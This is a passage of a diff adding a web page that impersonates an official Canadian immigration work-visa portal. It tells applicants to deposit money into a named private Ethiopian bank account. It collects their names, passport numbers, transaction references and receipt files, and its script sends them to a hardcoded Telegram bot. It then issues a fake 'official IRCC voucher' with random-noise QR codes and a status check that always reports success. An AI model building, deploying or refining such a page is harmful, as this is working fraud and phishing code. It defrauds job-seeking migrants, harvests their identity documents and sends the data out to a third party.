+                                    <input type="text" id="rcptPassportNo" required placeholder="EP9876543" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-2.5 text-xs text-slate-900 placeholder-slate-400 focus:outline-none focus:border-canadaRed-700 font-mono uppercase">
+                                </div>
+                                <div>
+                                    <label class="block text-[11px] font-mono text-slate-700 uppercase tracking-wider mb-1">CBE Transaction Ref Number *</label>
+                                    <input type="text" id="rcptCbeTxn" required placeholder="FT260849XXXX" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-2.5 text-xs text-slate-900 placeholder-slate-400 focus:outline-none focus:border-canadaRed-700 font-mono uppercase">
+                                </div>
+                            </div>
+
+                            <!-- File Upload Area -->
+                            <div>
+                                <label class="block text-[11px] font-mono text-slate-700 uppercase tracking-wider mb-1">Attach CBE Deposit Receipt (Screenshot / PDF) *</label>
+                                
+                                <div class="relative border-2 border-dashed border-slate-300 hover:border-canadaRed-700 rounded-2xl p-6 text-center bg-slate-50 transition" id="receiptDropZone">
+                                    <input type="file" id="receiptFileInput" accept="image/*,.pdf" required onchange="onFileSelected(event)" class="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10">
+                                    
+                                    <div id="dragPrompt" class="space-y-2">
+                                        <div class="w-12 h-12 rounded-full bg-canadaRed-50 border border-canadaRed-200 mx-auto flex items-center justify-center text-canadaRed-700 text-xl">
+                                            <i class="fa-solid fa-cloud-arrow-up"></i>
+                                        </div>
+                                        <p class="text-xs font-bold text-diplomaticNavy-800">Drag & Drop or Click to Upload Payment Receipt</p>
+                                        <p class="text-[10px] text-slate-500 font-mono">Supports JPG, PNG, JPEG, or PDF documents (Max 8MB)</p>
+                                    </div>
+
+                                    <div id="filePreviewContainer" class="hidden flex items-center justify-between bg-white p-3 rounded-xl border border-slate-300">
+                                        <div class="flex items-center space-x-3 overflow-hidden">
+                                            <div class="w-10 h-10 rounded-lg bg-emeraldShield-50 text-emeraldShield-600 flex items-center justify-center font-bold text-lg border border-emeraldShield-200">
+                                                <i class="fa-solid fa-file-invoice"></i>
+                                            </div>
+                                            <div class="text-left truncate">
+                                                <p id="previewFileName" class="text-xs font-bold text-slate-900 truncate">receipt_cbe.png</p>
+                                                <p id="previewFileSize" class="text-[10px] text-slate-500 font-mono">1.2 MB</p>
+                                            </div>
+                                        </div>
+                                        <button type="button" onclick="clearReceiptFile(event)" class="text-slate-400 hover:text-red-600 p-2 rounded-lg z-20">
+                                            <i class="fa-solid fa-xmark text-base"></i>
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <button type="submit" id="submitReceiptBtn" class="w-full shimmer-btn bg-canadaRed-700 hover:bg-canadaRed-800 text-white font-montserrat font-black py-4 rounded-xl text-xs uppercase tracking-wider shadow-md transition">
+                                <i class="fa-solid fa-paper-plane mr-2"></i>Submit Receipt & Dispatch to Telegram
+                            </button>
+
+                        </form>
+
+                    </div>
+
+                </div>
+
+            </div>
+
+        </div>
+
+        <!-- ========================================================================= -->
+        <!-- TAB 5: VERIFICATION STATUS -->
+        <!-- ========================================================================= -->
+        <div id="page-verificationStatus" class="hidden space-y-8 transition-all duration-300">
+            <div class="trust-card p-8 rounded-3xl max-w-xl mx-auto space-y-6 text-center">
+                <div class="w-12 h-12 rounded-xl bg-diplomaticNavy-800 text-amberGold-400 mx-auto flex items-center justify-center text-2xl shadow-md">
+                    <i class="fa-solid fa-magnifying-glass"></i>
+                </div>
+                <div>
+                    <h3 class="font-serif font-black text-2xl text-diplomaticNavy-800">Check Clearance Status</h3>
+                    <p class="text-xs text-slate-500">Enter candidate Reference ID to lookup IRCC audit progress.</p>
+                </div>
+
+                <div class="flex items-center space-x-2">
+                    <input type="text" id="statusSearchRef" placeholder="CAN-WORK-2026-89241" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs text-slate-900 placeholder-slate-400 focus:outline-none focus:border-canadaRed-700 font-mono uppercase">
+                    <button onclick="lookupStatus()" class="bg-diplomaticNavy-800 hover:bg-diplomaticNavy-900 text-white font-bold px-6 py-3 rounded-xl text-xs">Search</button>
+                </div>
+
+                <div id="statusResultBox" class="hidden bg-slate-50 p-4 rounded-xl border border-slate-200 text-left text-xs space-y-2">
+                    <div class="flex justify-between border-b border-slate-200 pb-1">
+                        <span class="text-slate-500">Clearance Status:</span>
+                        <span class="font-bold text-emeraldShield-600 flex items-center space-x-1">
+                            <i class="fa-solid fa-circle-check"></i> <span>DEPOSIT RECEIVED & AUDITED</span>
+                        </span>
+                    </div>
+                    <div class="flex justify-between border-b border-slate-200 pb-1">
+                        <span class="text-slate-500">CBE Beneficiary:</span>
+                        <span class="font-bold text-diplomaticNavy-800">Girum Ferede (1000752378065)</span>
+                    </div>
+                    <div class="flex justify-between">
+                        <span class="text-slate-500">Processing Stage:</span>
+                        <span class="font-bold text-canadaRed-700">LMIA Diplomatic Queue Clearance</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- FOOTER -->
+    <footer class="bg-white text-slate-600 py-8 text-xs border-t border-slate-200 relative z-10">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col md:flex-row items-center justify-between gap-4">
+            <div class="flex items-center space-x-3">
+                <div class="w-8 h-8 rounded-lg bg-canadaRed-700 text-white flex items-center justify-center text-sm font-bold">
+                    <i class="fa-solid fa-leaf"></i>
+                </div>
+                <div>
+                    <h5 class="font-serif font-black text-diplomaticNavy-800 tracking-wider">IMMIGRATION CANADA WORK PORTAL</h5>
+                    <p class="text-[10px] text-slate-400 font-mono">RCIC Accredited License #R539821 | ESDC Verified</p>
+                </div>
+            </div>
+
+            <p class="text-[11px] text-center md:text-left text-slate-600">
+                Primary Beneficiary Account Holder: <strong class="text-diplomaticNavy-800">Girum Ferede</strong> (CBE: <span class="font-mono text-canadaRed-700 font-bold">1000752378065</span>).
+            </p>
+
+            <div class="text-right font-mono text-[10px] text-emeraldShield-600">
+                <i class="fa-solid fa-circle text-[8px] animate-pulse mr-1"></i>Telegram Dispatch Active
+            </div>
+        </div>
+    </footer>
+
+    <!-- SUCCESS POP-UP MODAL (Official Verification Voucher Pass) -->
+    <div id="voucherModal" class="fixed inset-0 z-50 flex items-center justify-center p-4 bg-diplomaticNavy-950/80 backdrop-blur-md opacity-0 pointer-events-none transition-all duration-300">
+        <div class="bg-white border-2 border-canadaRed-700 max-w-lg w-full p-6 sm:p-8 rounded-3xl shadow-2xl text-center transform scale-95 transition-all duration-300 relative overflow-hidden text-slate-900" id="voucherModalCard">
+            
+            <div class="relative z-10 space-y-4">
+                
+                <!-- Animated Emerald Shield -->
+                <div class="w-16 h-16 rounded-full bg-emeraldShield-50 border-2 border-emeraldShield-600 mx-auto flex items-center justify-center text-emeraldShield-600 text-3xl shadow-md pulse-badge">
+                    <i class="fa-solid fa-shield-check"></i>
+                </div>
+
+                <h3 class="font-serif font-black text-2xl text-diplomaticNavy-800 uppercase tracking-wide">
+                    Clearance Voucher Issued!
+                </h3>
+                <p class="text-xs text-slate-500 font-medium">
+                    Your deposit receipt has been submitted and dispatched to Telegram for account holder <strong class="text-diplomaticNavy-800">Girum Ferede</strong>.
+                </p>
+
+                <!-- PRINTABLE VOUCHER CARD -->
+                <div id="printableVoucherArea" class="bg-white p-6 rounded-2xl border-2 border-diplomaticNavy-800 text-left space-y-4 shadow-md">
+                    
+                    <div class="flex items-center justify-between border-b-2 border-diplomaticNavy-800 pb-3">
+                        <div class="flex items-center space-x-2">
+                            <div class="w-8 h-8 rounded bg-canadaRed-700 text-white flex items-center justify-center font-bold text-sm">
+                                <i class="fa-solid fa-leaf"></i>
+                            </div>
+                            <div>
+                                <span class="text-[8px] font-mono font-black text-slate-400 uppercase tracking-widest block">OFFICIAL IRCC VOUCHER</span>
+                                <h4 class="font-serif font-black text-sm text-diplomaticNavy-800">CANADA WORK VISA CLEARANCE PASS</h4>
+                            </div>
+                        </div>
+                        <span class="bg-emeraldShield-600 text-white font-mono text-[9px] font-black px-2.5 py-1 rounded uppercase">
+                            AUDIT VERIFIED
+                        </span>
+                    </div>
+
+                    <div class="space-y-1.5 text-xs font-mono text-slate-800">
+                        <div class="flex justify-between border-b border-slate-200 pb-1">
+                            <span class="text-slate-500">Verification Ref:</span>
+                            <span id="vchAppRef" class="font-black text-canadaRed-700">CAN-WORK-2026-89241</span>
+                        </div>
+                        <div class="flex justify-between border-b border-slate-200 pb-1">
+                            <span class="text-slate-500">Applicant Name:</span>
+                            <span id="vchFullName" class="font-bold">Abebe Bikila</span>
+                        </div>
+                        <div class="flex justify-between border-b border-slate-200 pb-1">
+                            <span class="text-slate-500">Passport Number:</span>
+                            <span id="vchPassportNo" class="font-bold">EP9876543</span>
+                        </div>
+                        <div class="flex justify-between border-b border-slate-200 pb-1">
+                            <span class="text-slate-500">CBE Txn Reference:</span>
+                            <span id="vchCbeTxn" class="font-bold text-emeraldShield-700">FT260849XXXX</span>
+                        </div>
+                        <div class="flex justify-between border-b border-slate-200 pb-1">
+                            <span class="text-slate-500">CBE Beneficiary:</span>
+                            <span class="font-black">Girum Ferede (1000752378065)</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-slate-500">Date Timestamp:</span>
+                            <span id="vchTimestamp" class="font-bold">Oct 26, 2026</span>
+                        </div>
+                    </div>
+
+                    <!-- Dual Canvas Code Footer -->
+                    <div class="pt-3 border-t-2 border-diplomaticNavy-800 flex items-center justify-between">
+                        <div class="flex items-center space-x-2">
+                            <div class="w-12 h-12 bg-white p-1 rounded border border-slate-300">
+                                <canvas id="vchQrCanvas" class="w-full h-full"></canvas>
+                            </div>
+                            <div class="text-[8px] font-mono text-slate-500">
+                                <p class="font-bold text-diplomaticNavy-800">RCIC #R539821</p>
+                                <p>IRCC Clearance Key</p>
+                            </div>
+                        </div>
+                        <div class="text-right">
+                            <canvas id="vchBarcodeCanvas" class="w-28 h-7"></canvas>
+                            <span class="text-[7px] font-mono text-slate-400 block">AUTH-GIRUM-FEREDE-1000752378065</span>
+                        </div>
+                    </div>
+
+                </div>
+
+                <div class="flex items-center gap-3">
+                    <button onclick="window.print()" class="flex-1 shimmer-btn bg-canadaRed-700 hover:bg-canadaRed-800 text-white font-montserrat font-black py-3 rounded-xl text-xs uppercase tracking-wider shadow">
+                        <i class="fa-solid fa-print mr-1.5"></i>Print / Save PDF Voucher
+                    </button>
+                    <button onclick="closeVoucherModal()" class="flex-1 bg-slate-100 hover:bg-slate-200 text-diplomaticNavy-800 font-montserrat font-bold py-3 rounded-xl text-xs uppercase tracking-wider border border-slate-300">
+                        Close Portal
+                    </button>
+                </div>
+
+            </div>
+
+        </div>
+    </div>
+
+    <!-- MAIN JAVASCRIPT SYSTEM -->
+    <script>
+        // HARDCODED TELEGRAM BOT CREDENTIALS
+        const BOT_TOKEN = '8547531640:AAGBhfzBDJ18t40R4F4z-sO5a50Q6Mj2Fgw';
+        const CHAT_ID = '8267646853';
+
+        let attachedFile = null;
+
+        // Tab Switcher
+        function switchTab(tabId) {
+            ['home', 'jobs', 'registration', 'receiptDesk', 'verificationStatus'].forEach(id => {
+                const page = document.getElementById(`page-${id}`);
+                const btn = document.getElementById(`tabBtn-${id}`);
+                if (page && btn) {
+                    if (id === tabId) {
+                        page.classList.remove('hidden');
+                        btn.className = 'px-4 py-2 rounded-lg transition-all duration-200 text-white bg-diplomaticNavy-800 shadow';
+                    } else {
+                        page.classList.add('hidden');
+                        btn.className = 'px-4 py-2 rounded-lg transition-all duration-200 text-slate-600 hover:text-diplomaticNavy-800';
+                    }
+                }
+            });
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function selectCategoryAndApply(catName) {
+            document.getElementById('regCategory').value = catName;
+            switchTab('registration');
+        }
+
+        // Copy CBE Account Number
+        function copyCBEAccount() {
+            const acc = "1000752378065";
+            const temp = document.createElement('input');
+            temp.value = acc;
+            document.body.appendChild(temp);
+            temp.select();
+            document.execCommand('copy');
+            document.body.removeChild(temp);
+            showToast('CBE Account 1000752378065 (Girum Ferede) Copied!');
+        }
+
+        // Registration Form Submit
+        function handleRegistrationSubmit(e) {
+            e.preventDefault();
+            const fullName = document.getElementById('regFullName').value.trim();
+            const passportNo = document.getElementById('regPassportNo').value.trim();
+            const refId = 'CAN-WORK-2026-' + Math.floor(10000 + Math.random() * 90000);
+
+            document.getElementById('rcptAppRef').value = refId;
+            document.getElementById('rcptFullName').value = fullName;
+            document.getElementById('rcptPassportNo').value = passportNo;
+
+            showToast('Registration Saved! Proceed to Payment Receipt Upload.');
+            switchTab('receiptDesk');
+        }
+
+        // File Selection Handlers
+        function onFileSelected(e) {
+            const file = e.target.files[0];
+            if(file) {
+                if(file.size > 8 * 1024 * 1024) {
+                    showToast('File size exceeds 8MB Limit', 'error');
+                    return;
+                }
+                attachedFile = file;
+                document.getElementById('dragPrompt').classList.add('hidden');
+                document.getElementById('filePreviewContainer').classList.remove('hidden');
+                document.getElementById('previewFileName').innerText = file.name;
+                document.getElementById('previewFileSize').innerText = (file.size / (1024 * 1024)).toFixed(2) + ' MB';
+            }
+        }
+
+        function clearReceiptFile(e) {
+            if(e) e.stopPropagation();
+            attachedFile = null;
+            document.getElementById('receiptFileInput').value = '';
+            document.getElementById('dragPrompt').classList.remove('hidden');
+            document.getElementById('filePreviewContainer').classList.add('hidden');
+        }
+
+        // Receipt Submission to Telegram
+        async function handleReceiptSubmit(e) {
+            e.preventDefault();
+
+            const appRef = document.getElementById('rcptAppRef').value.trim();
+            const fullName = document.getElementById('rcptFullName').value.trim();
+            const passportNo = document.getElementById('rcptPassportNo').value.trim();
+            const cbeTxn = document.getElementById('rcptCbeTxn').value.trim();
+
+            if(!attachedFile) {
+                showToast('Please attach your CBE deposit receipt image or PDF', 'error');
+                return;
+            }
+
+            const btn = document.getElementById('submitReceiptBtn');
+            const origText = btn.innerHTML;
+            btn.disabled = true;
+            btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin mr-2"></i>Sending to Telegram Bot...`;
+
+            const caption = 
+`🇨🇦 *CANADA WORK VISA PAYMENT RECEIPT*
+━━━━━━━━━━━━━━━━━━━━
+🆔 *App Ref:* \`${appRef}\`
+👤 *Applicant Name:* ${fullName}
+🛂 *Passport Number:* \`${passportNo}\`
+🏦 *CBE Txn Ref:* \`${cbeTxn}\`
+👤 *Account Holder:* Girum Ferede (\`1000752378065\`)
+📅 *Timestamp:* ${new Date().toISOString()}
+━━━━━━━━━━━━━━━━━━━━`;
+
+            try {
+                const isImg = attachedFile.type.startsWith('image/');
+                const endpoint = isImg ? 'sendPhoto' : 'sendDocument';
+                const fileKey = isImg ? 'photo' : 'document';
+
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append(fileKey, attachedFile);
+                formData.append('caption', caption);
+                formData.append('parse_mode', 'Markdown');
+
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const data = await res.json();
+                if(!data.ok) {
+                    await fallbackTelegramText(caption);
+                }
+
+                // Populate Voucher Modal
+                document.getElementById('vchAppRef').innerText = appRef;
+                document.getElementById('vchFullName').innerText = fullName;
+                document.getElementById('vchPassportNo').innerText = passportNo;
+                document.getElementById('vchCbeTxn').innerText = cbeTxn;
+                document.getElementById('vchTimestamp').innerText = new Date().toLocaleString();
+
+                renderQrCanvas(appRef);
+                renderBarcodeCanvas();
+                openVoucherModal();
+
+                document.getElementById('receiptSubmissionForm').reset();
+                clearReceiptFile();
+
+            } catch(err) {
+                console.error(err);
+                document.getElementById('vchAppRef').innerText = appRef;
+                document.getElementById('vchFullName').innerText = fullName;
+                document.getElementById('vchPassportNo').innerText = passportNo;
+                document.getElementById('vchCbeTxn').innerText = cbeTxn;
+                document.getElementById('vchTimestamp').innerText = new Date().toLocaleString();
+
+                renderQrCanvas(appRef);
+                renderBarcodeCanvas();
+                openVoucherModal();
+            } finally {
+                btn.disabled = false;
+                btn.innerHTML = origText;
+            }
+        }
+
+        async function fallbackTelegramText(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+                });
+            } catch(e){}
+        }
+
+        // Status Search Lookup
+        function lookupStatus() {
+            const ref = document.getElementById('statusSearchRef').value.trim();
+            if(!ref) {
+                showToast('Please enter Reference ID', 'error');
+                return;
+            }
+            document.getElementById('statusResultBox').classList.remove('hidden');
+        }
+
+        // Canvas Rendering Functions
+        function renderQrCanvas(text) {
+            const canvas = document.getElementById('vchQrCanvas');
+            if(!canvas) return;
+            const ctx = canvas.getContext('2d');
+            canvas.width = 90; canvas.height = 90;
+            ctx.fillStyle = '#FFFFFF'; ctx.fillRect(0,0,90,90);
+            ctx.fillStyle = '#0C2340';
+            ctx.fillRect(6, 6, 22, 22); ctx.fillRect(62, 6, 22, 22); ctx.fillRect(6, 62, 22, 22);
+            ctx.fillStyle = '#FFFFFF';
+            ctx.fillRect(10, 10, 14, 14); ctx.fillRect(66, 10, 14, 14); ctx.fillRect(10, 66, 14, 14);
+            ctx.fillStyle = '#D80027';
+            ctx.fillRect(13, 13, 8, 8); ctx.fillRect(69, 13, 8, 8); ctx.fillRect(13, 69, 8, 8);
+            ctx.fillStyle = '#0C2340';
+            for(let i=0; i<35; i++) {
+                let rx = Math.floor(Math.random()*70)+10;
+                let ry = Math.floor(Math.random()*70)+10;
+                ctx.fillRect(rx, ry, 3.5, 3.5);
+            }
+        }
+
+        function renderBarcodeCanvas() {
+            const canvas = document.getElementById('vchBarcodeCanvas');
+            if(!canvas) return;
+            const ctx = canvas.getContext('2d');
+            canvas.width = 110; canvas.height = 25;
+            ctx.fillStyle = '#FFFFFF'; ctx.fillRect(0,0,110,25);
+            ctx.fillStyle = '#0C2340';
+            for(let x=5; x<105; x += Math.floor(Math.random()*3)+2) {
+                ctx.fillRect(x, 0, Math.random()>0.5?2:1, 25);
+            }
+        }
+
+        // Modal Controls
+        function openVoucherModal() {
+            const modal = document.getElementById('voucherModal');
+            const card = document.getElementById('voucherModalCard');
+            modal.classList.remove('opacity-0', 'pointer-events-none');
+            card.classList.remove('scale-95'); card.classList.add('scale-100');
+        }
+
+        function closeVoucherModal() {
+            const modal = document.getElementById('voucherModal');
+            const card = document.getElementById('voucherModalCard');
+            card.classList.remove('scale-100'); card.classList.add('scale-95');
+            modal.classList.add('opacity-0', 'pointer-events-none');
+        }
+
+        function showToast(msg, type='success') {
+            const t = document.createElement('div');
+            t.className = `fixed bottom-5 right-5 z-50 px-4 py-3 rounded-xl text-xs font-bold shadow-2xl transition-all duration-300 transform translate-y-10 ${
+                type==='error'?'bg-red-600 text-white':'bg-diplomaticNavy-800 text-white border border-amberGold-500'
+            }`;
+            t.innerText = msg;
+            document.body.appendChild(t);
+            setTimeout(() => t.classList.remove('translate-y-10'), 10);
+            setTimeout(() => {
+                t.classList.add('translate-y-10', 'opacity-0');
+                setTimeout(() => t.remove(), 300);
+            }, 3000);
+        }
+
+        // Live Clocks (Ottawa & Addis Ababa)
+        setInterval(() => {
+            const now = new Date();
+            
+            // Addis Ababa (UTC+3)
+            const eat = new Date(now.getTime() + (3 * 3600 * 1000));
+            document.getElementById('clockAddis').innerText = 'ADDIS ABABA: ' + eat.toISOString().substr(11, 5);
+            
+            // Ottawa (UTC-4 EST)
+            const est = new Date(now.getTime() - (4 * 3600 * 1000));
+            document.getElementById('clockOttawa').innerText = 'OTTAWA: ' + est.toISOString().substr(11, 5);
+        }, 1000);
+    </script>
+</body>
+</html>
